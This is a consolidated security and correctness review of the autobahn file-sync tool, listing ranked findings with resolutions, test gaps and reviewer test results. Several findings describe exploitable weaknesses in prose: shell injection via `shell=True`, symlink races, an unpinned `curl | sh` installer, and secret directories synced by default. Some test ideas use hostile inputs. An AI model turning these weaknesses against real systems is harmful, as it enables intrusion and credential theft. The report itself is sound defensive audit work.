- **Where:** the mount boundary recorded in `sessions/<id>/mounts`; the state word written by `src/supervisor/mod.rs`
- **What:** With `ignore_mounts = false`, a mounted volume inside the alpha syncs normally. Detaching it leaves an empty mount point, and the session reports `synchronized`, `error: null`, no conflicts and no blocked paths, while the beta still holds every file the volume had. Nothing is deleted — the recorded boundary appears to keep protecting the content — but the state word claims agreement between sides that differ, and nothing names the mount. Reproduced with a 50 MB APFS image, `two-way-conflict`, 22 cycles after a forced flush.
- **Fix:** [MAC-1](fixes/MAC-1-detached-mount-not-halted.md). Either drop the boundary with the flag, or report it; a session whose sides differ must not read `synchronized`.

### Peering (experimental), additional

#### M-42. Peering temporary filenames collide between channel threads

- **Sources:** ASTRA F20 (P2); OPUS H7 sub-item
- **Where:** `src/peering.rs:267`
- **What:** `.<name>.<pid>.tmp` contains only destination name and PID; multiple workers on one pooled agent write the same lease, config or name file concurrently; an open descriptor can modify an inode after another thread publishes it.
- **Fix:** unique exclusive temporaries; serialize shared-state updates (does not replace H-10).
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-6](fixes/PEER-6-fence-and-lease.md). Documented in `docs/peering.md`.

#### M-43. Multiple peering groups overwrite one host-wide identity

- **Sources:** ASTRA F21 (P2)
- **Where:** `src/supervisor/mod.rs:431`; `src/peering.rs:510`
- **What:** Groups targeting `host:/a` and `host:/b` push different specs into the same `peering/name`; last wins; failover derivation covers only the matching subset.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-8](fixes/PEER-8-identity-config-handoff.md). Documented in `docs/peering.md`.

#### M-44. Followers take over using outdated pushed configuration

- **Sources:** ASTRA F22 (P2)
- **Where:** `src/supervisor/peer.rs:45`
- **What:** Config is derived before an indefinitely long following loop that reads leases but never refreshes pushed state.
- **Fix:** reload and validate immediately before committing takeover.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-8](fixes/PEER-8-identity-config-handoff.md). Documented in `docs/peering.md`.

#### M-45. Handoff, follower and lease-timing bugs in peering

- **Sources:** OPUS "Related peering bugs" (all Confirmed, Medium)
- **Where:** `src/supervisor/mod.rs:304-318,493-497`; `src/supervisor/peer.rs:291-320`
- **What:**
  - Handoff never completes with plain groups or a paused session (`handed >= sessions` counts every plan but plain/paused never call `handed_one`).
  - Plain groups stop while the alpha follows a beta (`Role::Follower` runs only `attach_as_agent`).
  - `peering yield --to <beta>` does not hand off to that beta (`to` unvalidated; `follow()` never checks `lease.leader == star.name`); a typo means nobody leads for 150 s.
  - Backoff (up to 300 s plus 24% jitter) can outlast the takeover wait, so a beta takes over from a healthy alpha after a ~1 min blip.
  - `for_alpha` and both yield paths use `DEFAULT_PEERING_TTL`, ignoring the configured TTL.
- **Resolution (2026-09-24):** deferred past v1 because peering is dangerously experimental. Ticket [PEER-8](fixes/PEER-8-identity-config-handoff.md). Documented in `docs/peering.md`.

### Tests, benchmarks and CI process

#### M-46. The standing-watch e2e test uses an insufficient synchronization condition and fails on macOS

- **Sources:** ASTRA F34 (P2; failed twice at `tests/e2e.rs:1729`)
- **Where:** `tests/e2e.rs:1723-1729`
- **What:** Stops on the first cycle where beta's scan is not skipped, then requires the latest beta edit on alpha. A delayed event from an earlier transition satisfies the stop while the new edit is unobserved. Evidence points to a test flaw, not proven production loss.
- **Fix:** bounded user-visible convergence or observed generation; separately test late events and polling.

#### M-47. The connection-cut oracle can accept loss of the latest user versions

- **Sources:** ASTRA F33 (P2)
- **Where:** `tests/e2e.rs:879`
- **What:** Permits old or new bytes for a modified file and absence or new bytes for a created file, then requires equal trees when conflict-free. Both sides reverting, or both losing the new file, passes.
- **Fix:** require each unsuperseded user value to survive somewhere and conflict-free recovery to converge to the expected result; extend the fault matrix.

#### M-48. Benchmark source changes bypass CI; the harness package is never built or tested

- **Sources:** ASTRA F35 (P2); OPUS CI gaps
- **Where:** `.github/workflows/ci.yml:24` (`paths-ignore: bench/**`)
- **Fix:** gate benchmark source changes; do not apply report-only exclusions to executable code. Address H-14/H-15 first.
- **Resolution (2026-09-24):** Decided against. Bench stays out of CI, and `paths-ignore: bench/**` stays.

#### M-49. Tray code is built but its feature-gated tests never run in CI; `--features tray` is never linted on Linux

- **Sources:** ASTRA F36 (P2); OPUS CI gaps
- **Where:** `ci.yml:109`, `apps/macos/build.sh:23`, `src/tray.rs:1295`
- **Resolution, Linux half (2026-09-24):** Linux tray is not built in CI or releases, and won't be. `docs/macos-app.md` now has an "On Linux (experimental, unverified)" build-it-yourself section, and README and the app doc no longer claim Linux support. The guide also flags that `src/tray.rs` never initializes GTK, so a Linux build may show no icon. Making it a supported platform is an entry in `WISHLIST.md`. The macOS half, running tray tests in CI, is part of the 4d decision, still pending.

#### M-50. `bench/ab.sh --remote` verifies the wrong filesystem

- **Sources:** ASTRA F30 (P2)
- **Where:** `bench/ab.sh:112,129,138`
- **What:** `--remote` changes the destination and agent command but creation, cleanup, manifest checks, the observer and the observer address remain local; the cold-sync loop checks the empty local destination for ten minutes and does not treat timeout as failure; binaries are not provisioned remotely.
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-4](fixes/BENCH-4-ab-remote.md).

#### M-51. Cold-sync aggregation includes destination-width-contaminated jobs

- **Sources:** ASTRA F31 (P2)
- **Where:** `bench/aggregate.py:255`
- **What:** Latency/resource aggregation excludes tainted jobs; cold-sync aggregation does not.
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-5](fixes/BENCH-5-result-accuracy.md).

#### M-52. Verification scripts and the CLI tour invoke the removed `up` subcommand; `scripts/mi` writes to the real `~/.autobahn`

- **Sources:** ASTRA F32 (P2); OPUS Low
- **Where:** `scripts/mi:97`, `bench/verify/crash.sh:57`, `bench/verify/differential.sh:40`
- **Fix:** update to `watch`/`sync`; fail immediately when the subject does not start.
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-6](fixes/BENCH-6-removed-up-command.md).
- **Correction (2026-09-24):** Eleven scripts call the removed command, not three: `scripts/mi` and ten in `bench/verify/`.

#### M-53. Unit tests write to the real `~/.autobahn`, share session ids, and mutate global environment

- **Sources:** OPUS §5 suite health
- **Where:** `src/transport/mux.rs` tests (`serve_agent` → `create_endpoint` with real `$HOME`; rewrote `~/.autobahn/staging/mux-test-17-beta.scancache` during review; `remove_dir_all` under it), all 8 mux tests use `mux-test-17`; `install.rs:399` sets `HOME`; `supervisor.rs:1177` sets `AUTOBAHN_SSH`/`AUTOBAHN_AGENTS_DIR` and never unsets; `ATTACH_COMMAND_VARIABLE` leaks on panic (all become `unsafe` under edition 2024)
- **Fix:** isolate `HOME` in unit tests; unique session ids.

#### M-54. Two tests pass without running; fixed-sleep negative checks

- **Sources:** OPUS §5
- **What:** TLC replay tests return early without `AUTOBAHN_TLC=1` and report `ok`; so does the non-UTF-8 test on APFS. 500 ms/3 s/300 ms sleeps can pass with broken behavior; wall-clock bounds risky on the FreeBSD VM.
- **Fix:** `#[ignore]` or a visible skip.

#### M-55. `bench/job.py` CPU aggregation can decrease when a host misses a bucket

- **Sources:** ASTRA cautions
- **Fix:** per-host window deltas before summing.
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-5](fixes/BENCH-5-result-accuracy.md).

#### M-56. `examples/cycle_cost.rs` includes full synchronous ancestor serialization in its total, unlike the journaled production cycle

- **Sources:** ASTRA cautions
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-5](fixes/BENCH-5-result-accuracy.md).

#### M-57. `orchestrate.py` interpolates remote output into `shell=True` commands

- **Sources:** KIMI ABN-L15 (Low, Likely)
- **Where:** `bench/orchestrate.py:490,743`; `bench/verify/launch.py:62,121`
- **What:** `json.dumps` does not escape single quotes; a tampered instance returns a key line that executes on the operator's workstation.
- **Fix:** `shlex.quote` or argv lists.
- **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-3](fixes/BENCH-3-orchestrate-shell.md).

#### M-58. Release tags build without running tests; a tag can point at a commit CI skipped

- **Sources:** OPUS CI gaps
- **What:** `paths-ignore` or `[skip mac]` can leave a tagged commit untested; examples compile but never run.

---

## Low

### Permissions and state on disk

- **L-1. `config.toml`, the state root, session directories and status files are created with the default umask (world-readable).** DEEPSEEK F17, F18; GLM L2; KIMI ABN-L1 (Confirmed); OPUS Low. `src/main.rs:2663,2674-2677`, `src/paths.rs:54-58`, `src/persist.rs:226-234`, `src/session/mod.rs:1213-1252`, `src/supervisor/mod.rs:2280-2285`, `src/service.rs:38-39`, `src/peering.rs:246-268`. `init`/`disable`/`enable` rewrite the config at umask defaults, relaxing a user-hardened 0600. The state root is 0700 only as a side effect of `control::bind`; manual `sync` or the fallback socket leaves ancestors at 0644. `Config::load` does no ownership/writability check despite carrying executable hooks. Fix: 0700 state root enforced at startup, 0600 files, preserve config mode, ssh-style warn/refuse on group/world-writable config. **Resolution (2026-09-24):** Fault, [LOCAL-02](fixes/LOCAL-02-state-and-config-permissions.md).
- **L-2. Predictable pid-based temp names in shared directories.** DEEPSEEK F16; KIMI ABN-M2. `src/persist.rs:226-233`, `src/session/ancestor.rs:193-200`, `src/update.rs:341,402-404`, `scripts/install.sh:152-155`, supervisor/reload/peer. Safe inside the owner-only state root; exploitable if `AUTOBAHN_HOME` is group-writable. Fix: randomized names, `O_EXCL`/`O_NOFOLLOW`. **Resolution (2026-09-24):** Fault, [LOCAL-02](fixes/LOCAL-02-state-and-config-permissions.md).
- **L-3. In-place chmod on hardlinked inodes.** KIMI ABN-L3 (Likely). `src/endpoint/local.rs:2607`. macOS has no `protected_hardlinks`; a root-running agent's exec-bit flip chmods the shared inode. Fix: publish mode changes by rename or refuse on multiply-linked files. **Resolution (2026-09-24):** Fault, [LOCAL-11](fixes/LOCAL-11-hardlink-chmod.md).
- **L-4. `base_signature` lstat-then-open race is an rsync-signature oracle.** KIMI ABN-L4 (Likely). `src/endpoint/local.rs:3001-3008`. Fix: `O_NOFOLLOW` + `fstat`. **Resolution (2026-09-24):** Covered, [T1-5](fixes/T1-5-staging-request-paths.md).
- **L-5. Watch-setup symlink TOCTOU.** KIMI ABN-L6 (Suspected). `src/endpoint/local.rs:242,266,401-408`. Watches an outside path; events fail `strip_prefix` and degrade to full rescans. **Resolution (2026-09-24):** Documented boundary, [LOCAL-10](fixes/LOCAL-10-descriptor-relative-rewrite.md).
- **L-6. No root/sudo guard.** KIMI ABN-L12 (Likely). No euid check; under sudo on macOS `$HOME` is the caller's, so `sudo autobahn watch` creates root-owned state and `sudo autobahn install` registers a root service reading a user-writable config with hooks. Fix: refuse mutating subcommands at euid 0 without an override. **Resolution (2026-09-24):** Fault, [LOCAL-08](fixes/LOCAL-08-refuse-root.md).
- **L-7. `run_sync` never expands `~` in endpoint arguments.** KIMI ABN-L13 (Confirmed). `src/main.rs:841-846`. A quoted `~/backup` becomes a literal `./~` tree.

### Wire and protocol hardening

- **L-8. `bincode` decodes use no explicit `with_limit`; bincode 1.3 is unmaintained (RUSTSEC-2025-0141).** DEEPSEEK F13; KIMI ABN-L16 (Suspected); OPUS Low. `src/transport/mod.rs:413-415,1163-1166`, `src/endpoint/remote.rs:241`, `src/session/ancestor.rs:647-679,744`. Slice-reader bounds and serde's cautious prealloc currently mitigate. Fix: state the limit in autobahn's code; plan bincode 2 migration (the epoch mechanism makes it feasible). The tray feature also pulls unmaintained GTK3 bindings and an unsound `glib 0.18`.
- **L-9. `Response::Scan` snapshots are not structurally validated (the delta path is); the variant is otherwise dead.** DEEPSEEK F23; KIMI ABN-L5 (Confirmed); OPUS Low. `src/endpoint/remote.rs:136-153`. Unsorted/duplicate children violate the ordering every merge assumes. Fix: `snapshot.root.validate(false)` on this arm, or remove the variant.
- **L-10. Oversized `AncestorRecord` wedges a follower permanently.** KIMI ABN-L7 (Likely). `src/session/ancestor.rs:721,731`. The 1 GiB cap is enforced on read, not append; a leader's oversized record fails every subsequent open until manual `reset`. Deferred past v1: ticket [PEER-7](fixes/PEER-7-ancestor-replica.md).
- **L-11. Peer can pin the client at 100% duty cycle.** KIMI ABN-L8 (Likely). `src/supervisor/mod.rs:1100-1140`. Instant `changed` answers defeat the interval cadence with no error, so backoff never applies. Fix: minimum cycle period.
- **L-12. Unbounded readdir materialization; `max_entry_count` checked only after the walk.** KIMI ABN-L10 (Confirmed). `src/scan/mod.rs:1059-1067`, `src/endpoint/observer.rs:401-405`. Fix: enforce the budget incrementally.
- **L-13. No mount-point (`st_dev`) boundary in the scanner.** KIMI ABN-L11 (Confirmed). `src/scan/mod.rs:851`. Unprivileged FUSE mounts control lstat/readdir/read timing (enabler for M-16, L-12, H-5). Fix: refuse to cross devices by default.
- **L-14. Scan-delta desync on reassembly error.** OPUS Low. `src/endpoint/remote.rs:141-187`. Safe only because every caller drops the session; set `last_snapshot = None` on any failure.
- **L-15. Digest reuse ignores ctime.** OPUS Low. `src/scan/mod.rs:1119-1123`. `touch -r` and `cp -p` over an existing inode are invisible; git records ctime.

### Journal, session and supervisor robustness

- **L-16. Journal directory entry not synced.** OPUS Low. `src/session/ancestor.rs:398-401,507-514`. A journal created by `checkpoint()` never has its directory entry synced; a later durable `intend()` skips it.
- **L-17. Intents can be lost at open.** OPUS Low. `ancestor.rs:238-268`. A format-upgrade rewrite truncates the journal while intents are unresolved; `stored_generation()` discards the list.
- **L-18. Compaction failure fails a good cycle.** OPUS Low. `ancestor.rs:376-381`. Loops on FUSE/network homes where directory fsync always fails.
- **L-19. Silent truncation of results.** OPUS Low. `src/endpoint/mod.rs:119-129`. `achieved_changes` zips results and transitions; a count mismatch leaves a stale ancestor.
- **L-20. Keep-both rename can overwrite.** OPUS Low. `src/endpoint/local.rs:1353-1371`. `rename()` checks existence then calls plain `fs::rename`; use `publish_rename(…, false)`.
- **L-21. Every install failure is `Unreachable`, including permanent ones, which then retry forever.** OPUS Low. `src/endpoint/remote.rs:413-418`. **Note (2026-09-24):** with FreeBSD dropped, this is what a self-built FreeBSD remote host hits when no agent binary is supplied. `WISHLIST.md` documents the workaround.
- **L-22. Upload errors hide the cause.** OPUS Low. `src/transport/install.rs:231-234`. Reports "Broken pipe" instead of the remote's stderr; stdout is piped and never read.
- **L-23. Reload validates a second read of the file, not the bytes it compared.** OPUS Low. `src/supervisor/reload.rs:183-209`.
- **L-24. Every reload stops every session, SSH connection and control socket.** OPUS Low. `src/supervisor/mod.rs:584-593`. Diff plans by identifier instead.
- **L-25. Pool slots are never evicted.** OPUS Low. `src/transport/mux.rs:534-632`. A host removed from config keeps its ssh process and agent until exit.
- **L-26. Racy-mtime protection is lost on adopted subtrees.** OPUS Low. `src/scan/mod.rs:253,295`. Incremental scans stamp `scanned_at = now`, so a later full scan trusts digests recorded while their mtime was racy.
- **L-27. `scanning` flag stuck after a walk panic or `EAGAIN` from `spawn`.** OPUS Low. `src/endpoint/observer.rs:367,390`. Every caller loops on the 60 s wait.
- **L-28. Wildcard negations under an ignored directory are dead and no longer reported; inside a region any negation re-includes.** OPUS Low. `src/scan/ignore.rs:103`.
- **L-29. `select` keeps only one relative path with nested groups.** OPUS Low. `src/main.rs:1433-1435`.
- **L-30. Progress keyed by `(group, host)`, so two betas on one host show each other's progress.** OPUS Low. `src/main.rs:3249`.
- **L-31. Docs disagree with the code on `one-way-conflict` (alpha deletes a file beta edited).** OPUS Low. `docs/modes.md:37`.

### Installer, CLI and misc

- **L-32. `curl | sh` installs from unpinned branch HEAD; no in-repo tar sanitization.** GLM L7. `scripts/install.sh:6,166`; `src/update.rs:336-341`. No `sudo` in the script limits blast radius.
- **L-33. `SymlinkMode::Raw` is the default; peer-chosen targets may point outside the root.** DEEPSEEK I1. `src/scan/mod.rs:163-174`. Autobahn never dereferences them, but it is a foot-gun for other tools and the enabler for C-2's symlink arm. Consider `Portable` default.
- **L-34. `on_alert` is an arbitrary shell command by design and inherits the caller's full environment when `watch` runs in a terminal.** DEEPSEEK I3. `src/alerts.rs:486-500`. Document.
- **L-41. `status` is unusable while a configuration edit is refused.** New, found on macOS during MAC-BENCH 1 (2026-09-24). Live reload keeps the last good configuration and the sessions keep syncing, but `status` parses the file itself and exits with the TOML error, printing nothing about the fleet — at exactly the moment a person has just edited the file and wants to know what happened. `issues` and `mi` are in the same position. **Resolution (2026-09-24):** ticket [MAC-2](fixes/MAC-2-status-during-refused-config.md): fall back to the recorded status files and lead with the refusal line.
- **L-42. A halted session alerts after about a minute, not the two the Mac bench assumes.** New, found on macOS during MAC-BENCH 5 (2026-09-24). `built_in_after` gives `Alert::Halted` a hold of `Duration::ZERO` (`src/config.rs:233`); the minute observed between a detached volume and its notification is `DEFAULT_COALESCE_AFTER`, which exists to gather a cascade. Measured: detached 00:10:04, one notification 00:11:05. The same run found that the halt cleared itself when the volume returned 33 s later, which contradicts `docs/safety.md:58` ("A halt needs a person; retrying never clears it"). **Resolution (2026-09-24):** ticket [MAC-3](fixes/MAC-3-halted-alert-timing.md).
- **L-35. Robustness nits.** GLM L9. `.expect` on poisonable locks (`src/transport/mux.rs:160-162`) inconsistent with `into_inner` elsewhere; unquoted home-relative remote command path (`src/transport/install.rs:31-32`) safe only because `protocol::version()` is a compile-time constant; add a charset guard.
- **L-36. Defense-in-depth: four staging/supply call sites join wire paths without `resolve_relative`.** GLM "verified safe" note. `src/endpoint/local.rs:757,840,965,1195`. Overlaps C-2.
  - **Correction (2026-09-24):** The four sites are not equivalent.
    - The supply site is not defense-in-depth; it is C-2 itself, fixed by [T1-1](fixes/T1-1-supply-confinement.md).
    - The two receive sites, the base signature and the patch-base open, are safe today only because the snapshot gate comes first. [T1-5](fixes/T1-5-staging-request-paths.md) makes that explicit. These are the counterpart of rsync CVE-2024-12086.
    - The `stage_locally` source path comes from the local snapshot and is already safe.
- **L-37. Committed build droppings and hygiene.** OPUS §4; GLM. A stale unstripped 4 MB `dist/agents/autobahn-linux-x86_64` is committed and `dist/` not ignored; `bench/` holds 626 tracked files (~245 MB, mostly results and logs; `bench/harness/target` has 538 files) although `.gitignore` excludes `bench/results-bench-*/`; `README.md:136` onward still says "The previous README follows, kept for merging"; three TODO files at root; `apps/macos/Info.plist` hard-codes `0.4.0` unchecked by the release guard.
- **L-38. No `rust-version` (MSRV), no `--locked` in CI or release builds.** OPUS §4.
- **L-39. `NO_COLOR` not honoured; ANSI printed to non-terminals.** OPUS §4.
- **L-40. Dead code.** OPUS §4. `let _ = shown;`, `let _ = inner;`, `let _ = intent_recorded;`, `let _ = root;`, the `Response::Scan` path, an immediately-invoked closure in `attempt_once`.

---

## Info / process

- **I-1. No `cargo audit`/`cargo deny`/dependabot in CI.** KIMI ABN-I1; DEEPSEEK §5; OPUS CI gaps. 200+ pinned crates, no advisory surfacing. None of the reviewers ran a live advisory scan; dependency-CVE status is asserted by nobody.
- **I-2. Default ignores exclude no secret-bearing directories.** KIMI ABN-I2. `src/config.rs:89` (`.git`, `.DS_Store`, `node_modules`, `target`). A root covering a home syncs `.ssh`/`.aws`/`.gnupg` to every destination, amplifying C-2, H-21, H-18.
- **I-3. Linux binaries unsigned; install is curl|sh with same-origin checksums.** KIMI ABN-I3. See H-28. **Resolution (2026-09-24):** step 2 of [REL-1](fixes/REL-1-release-integrity.md).
- **I-4. `INVARIANTS.md` I9 cites `oversized_frames_are_rejected_on_send`, removed in `84b5fc7`; the I9 text about outgoing/oversized messages is stale now that messages reassemble to 4 GiB.** OPUS §4.
- **I-5. Comments and docs that contradict the code.** OPUS §4. The `blocking` comment in `reconcile.rs` (H-8); the `sanitize` comment ("reconciliation never puts unsynchronizable content into an expectation", false for one-way modes); `how-it-works.md` Decision 4 (P-2); `ssh_argv` ("autobahn never copies or bootstraps it"); `hold_paused` ("a paused session holds no resources", but pooled SSH is kept); `main.rs:2797` tells users to restart after editing the config although reload is live; `safety.md:58` says a halt never clears by retrying, while an emptied-root halt clears itself as soon as the content returns (measured 2026-09-24, see L-42). Misplaced or fused doc comments at ≥15 sites: `local.rs:177-180,509-510,726-736,2681-2686`; `observer.rs:240-246,301-305`; `scan/mod.rs:813-820`; `main.rs:1004,1154,2116,2614-2633`; `tray.rs:748-762`; `session/mod.rs:96,872`; `transport/mod.rs:86-88,984-985`; `progress.rs`.
- **I-6. Commits on `main` that do not compile.** New, found on macOS during MAC-BENCH 3 (2026-09-24). `c4e4109` and `f68b0a8` fail with *error[E0004]: non-exhaustive patterns: `Command::Update { .. }` not covered* (`src/main.rs:547`): the enum variant was added in one commit and its match arm in another. `git bisect` cannot cross the range, and neither can the A/B gate — which is how it was found, since section 3 could not build a baseline binary. **Resolution (2026-09-24):** ticket [MAC-4](fixes/MAC-4-non-building-commits.md).

---

## Performance opportunities

Measurements are the reviewers' local microbenchmarks, not end-to-end claims.

- **P-1. Tiny remote-tree changes still process complete snapshots on both ends.** ASTRA F28. `src/transport/mod.rs:795`, `src/endpoint/remote.rs:198`. At 500k files a 40.6 MB snapshot produced a 38.7 KB delta, but agent preparation took 132 ms and controller decode/validate 43 ms (10k: 5.2/1.2 ms; 100k: 28/8 ms). Evaluate structural snapshot deltas; a wire change needs an epoch bump.
- **P-2. Reconcile walks the whole tree on every non-idle cycle and allocates a path `String` per node.** OPUS P1. `src/tree/reconcile.rs:291`. ASTRA measured reconciliation at 16 ms for 500k files, well below remote snapshot processing; ASTRA also notes recount and problem collection cost ~0.84 and ~0.97 ms at that size. Memoize on pointer identity; lazy paths. Any shortcut must preserve unresolved conflicts and problems.
- **P-3. The transition fold does not save the rehash that `how-it-works.md` claims.** OPUS P2. `fold_transition` keeps the lease's `scanned_at` and published files have fresh mtimes, so the racy rule re-reads every file just written; 2× read on a cold sync larger than RAM.
- **P-4. `digest_paths` walks the whole snapshot on every supply failure.** OPUS P3. `src/endpoint/local.rs:800-806,877-902`. Quadratic in failure bursts.
- **P-5. `apply` removes changes with `Vec::remove` one at a time.** OPUS P4. `src/tree/apply.rs:61`. O(k·n) on flat directories, in folds and journal replay.
- **P-6. Staging on another filesystem (the default) reads every last-use file twice.** OPUS P5. `src/endpoint/local.rs:2221-2240`. Rehash, EXDEV rename failure, then verifying copy. Compare `st_dev` once.
- **P-7. The change record keeps duplicates and, on macOS, events from ignored subtrees.** OPUS P6. `src/endpoint/local.rs:302-331`. A build in `target/` fills the 8,192 cap and forces a full scan each cycle; the transition's own temp files consume the budget.
- **P-8. Encode and LZ4 run while holding the shared writer mutex.** OPUS P7. `src/transport/mux.rs:390-396`, `src/transport/mod.rs:849-857`. One 8 MiB `StagePush` blocks every other session to that host.
- **P-9. The observer builds the watcher while holding its state lock.** OPUS P8. `src/endpoint/observer.rs:263-277`. Every session on the root stalls for the initial walk (~20 s on large trees) and on every 30 s retry.
- **P-10. `propagate_executability` rebuilds the whole tree every cycle on exFAT/FAT.** OPUS P9. `src/tree/executability.rs:124-135`. Defeats `nodes_share_storage`.
- **P-11. Scratch buffer retention misses its own case.** OPUS P10. `src/transport/mod.rs:1043-1137`. ~17 MB per thread (~500 MB RSS at 30 sessions); for 16 MiB chunks the compressed maximum exceeds the retention limit so the buffer is freed and re-zeroed every chunk.
- **P-12. Idle waits poll instead of blocking.** OPUS P11. 25 ms slices in backoff/pause, 50 ms control accept, 250 ms attach: >1,000 wakeups/s with 30 failing or paused sessions. `Condvar` per worker.
- **P-13. One-shot watcher avoidance does not reach configured or remote sync paths.** ASTRA F29. `src/supervisor/mod.rs:1565`, `src/transport/mod.rs:903`. Configured sync always sets `one_shot = false`; remote init does not carry the intent.
- **P-14. Smaller items.** OPUS info. Add `strip = true` and `codegen-units = 1` to the release profile (the agent uploaded to every host is unstripped); `read_directory` sorts twice; every entry costs `lstat` on a full path plus four allocations (a dirfd walk removes both); BLAKE3 is single-threaded per file; the shop reads the whole service log every 1.2 s to show three lines.

---

## Code quality (structural, not individually ranked)

From OPUS §4 and ASTRA's closing assessment.

- **Recurring design problem (ASTRA):** duplicated policy across entry points. Topology validation, session identity, explicit conflict resolution and active configuration each have multiple inconsistent implementations (H-1, H-2, H-12, H-13, M-38). Shared observation and peering depend on contracts tested below the boundary where the caller violates them (H-3, H-9).
- **Long functions (OPUS):** `local.rs` 5,125 lines, `main.rs` 4,023, `config.rs` 2,926, `supervisor/mod.rs` 2,776, `session/mod.rs` 2,239. `Config::plans()` ~540 lines with the `group.x.or(defaults.x)` pattern ~12 times; `run_resolve` ~425; `run_issues` ~265; `run_clean` ~220; `serve_channel` ~250 (mixes fence, anchoring, staging, transitions; H-9 hides here); `run_cycle` ~290 with near-duplicate alpha/beta blocks; `publish_file` ~160 with a side effect inside an `&&` chain; `scan_directory` ~280 with duplicated `Pending::Walk` handling. Suggested splits: `src/cli/` one file per verb plus `cli/format.rs` (`shop.rs` currently calls private items in `main.rs`); `supervisor/{worker,status,peering}.rs`; `resolve_settings()` in `config.rs`; one `apply_side()` in `session`; a `ChannelState` with a method per request in `transport`.
- **Reconciliation policy is implicit (OPUS):** `handle_disagreement_bidirectional` repeats "blocking → conflict, else transition" eight times with varying `old` and `alpha`/`alpha_sync` choices and no stated reason; root of M-33 and part of H-8. The `writable` check in `config.rs` uses `matches!`, so a new two-way mode would silently be read-only in the nesting check.
- **Duplication (OPUS):** `thousands`, `terminal_size`, key parsing and width/truncate helpers in both `pager.rs` and `shop.rs`; `format_age` copied into `tray.rs`; `format_size` (KiB) vs `format_bytes` (kB); `entries_below` twice; `canonical_root` and `resolve_for_identity` canonicalize with different rules; test helpers redefined in 5–7 modules; `unsafe { libc::isatty }` five times where `std::io::IsTerminal` would do; two TOML stacks (`toml 0.8`/`toml_edit 0.20` for parsing, `toml_edit 0.25` for editing).

---

## Test gaps (consolidated priority list)

Merged from OPUS §5 and ASTRA's table. Each maps to the finding it would have caught.

1. Emptied root holding only `Untracked` children; `Untracked` nodes at every depth in the reconcile proptest generator, every mode, with a "no silent loss" property (C-1).
2. Resolving an in-sync path twice; `resolve group ./`; every winner and mode; stale conflict records; further cycles after resolution (H-1).
3. Manual sync with equal, nested, aliased, and destination-contains-source roots (H-2).
4. Two endpoints sharing one observer through the real `transition()`: offer refusal and wake-up; two paths, an intervening scan, a transition from an older lease (H-3).
5. Incremental equals full for dir→dir replacement: swap, `rmdir`+`mkdir`, rename-over (H-4).
6. Deep-tree scan at ~2,000 levels; a deeply nested `Node` decoded on the router thread (H-5, H-6).
7. Supplying a file larger than a small cap, asserting peak `pending` size; memory and time-to-first-batch with empty and mismatching signatures (H-7).
8. Size-excluded file, FIFO or ignored symlink inside a deleted directory; an edit crossing `max_file_size` against a sibling deletion (H-8).
9. Peering: a lease accepted at a higher term while the old leader is mid-cycle, then an old-channel write without another lease request; concurrent admission through real handlers with barrier control; handoff with mixed plain/peering plans; `yield --to` (H-9, H-10, M-45).
10. Ancestor adoption: newer local journal-only history, older replica, journal-only replica (H-11).
11. Hostile `ScanDeltaHeader`: huge `length`, `block_size` 0/1/`u32::MAX`, expansion bomb; multi-frame message past a sane cap (H-19, M-10).
12. `supply_from` with absolute, `..`, symlinked or unrequested paths (C-2).
13. Permissions of staging entries and temp files during and after an interrupted transfer under a permissive umask, all placements; a planted symlink at a temp name (M-3).
14. Attach and control sockets refusing another uid; socket file mode (M-1).
15. Entry limits: warm a shared observer with a permissive caller, then a stricter one (M-23).
16. Polling fallback with an unannounced external write; re-included directory watch; root replaced while watched; runtime `watch_tree` failure and later recovery (M-24 to M-27).
17. Disable the last group or host, verify propagation stops, clean, enable, verify ancestor history survives (H-13, M-22).
18. A middle journal record with a flipped length field; an open that upgrades the format while an intent is unresolved (M-32, L-17).
19. A stale `.autobahn-tmp-apply-*` in a directory being deleted (M-30).
20. Worker panic or stdout write failure; panic in an agent channel; connection-setup and handshake timeouts (M-34, M-12).
21. Property test `apply(base, diff(base, target)) == target` over random trees; randomized rsync round trip with a forced weak-hash collision.
22. `service.rs`: unit and plist output with spaces, `%`, `"`, `&`, `<` in paths; `rotate_log` at threshold (M-21).
23. `update::run` with a fake fetcher: tampered binary, tampered bundle, missing `SHA256SUMS`, rollback restoring the bundle; restart failure after bundle replacement; nondefault registered executable paths; `install.sh` under shellcheck plus a smoke test against a draft release (M-17, M-40, M-41).
24. Reload that removes a running group or changes its mode or betas; reload while a cycle is in flight.
25. CLI exit codes; `status --json` schema stability; `init --force`; `enable`/`disable` on a symlinked config; `clean --dry-run`.
26. Spec coverage: add `two-way-paranoid` and the one-way modes to `MODES`; add refused or partial transitions; the spec has no notion of a subtree that left tracked scope (C-1, H-8, M-33 sit outside its alphabet).
27. Coverage is estimated, not measured (`cargo-llvm-cov` not installed). High: reconcile, ancestor, session fault harness, config, framing. Low: `tree/diff`, `tree/apply` (6 tests, though scan deltas travel on the wire), `supervisor/control.rs`, `update::run`. None: `service.rs`; `tray.rs` has one test that never runs in CI.

---

## Validation results reported by reviewers

| Check | ASTRA (macOS, Rust 1.91.1) | OPUS (macOS) |
|---|---|---|
| Library unit tests | 370 passed | — |
| Binary unit tests | 33 passed | — |
| End-to-end | 28 passed, 1 failed (`tests/e2e.rs:1729`, failed again on rerun; see M-46) | — |
| Supervisor integration | 38 passed | — |
| Spec harness | 5 success; TLC comparisons did not execute (no Java) | — |
| Full `cargo test --release` | 474 passed, 1 failed | 478 passed, 0 failed (4m05s) |
| `cargo fmt --check` | passed | clean |
| Clippy (CI-equivalent, warnings denied) | failed on 3 diagnostics (H-17) | CI run 35920255058 red (H-17) |
| Tray-feature compile | passed | — |
| Bench harness compile | passed | — |
| Shell/Python syntax | passed | — |
| Actual TLC model checking | not run (no Java) | — |

Directly reproduced by ASTRA in isolation: H-1, H-2, H-3, M-23, M-24, M-22 (dry run), H-7, H-16, and the removed `up` command (M-52). Reproduced by OPUS: C-1, H-4, H-5, M-25, M-27.

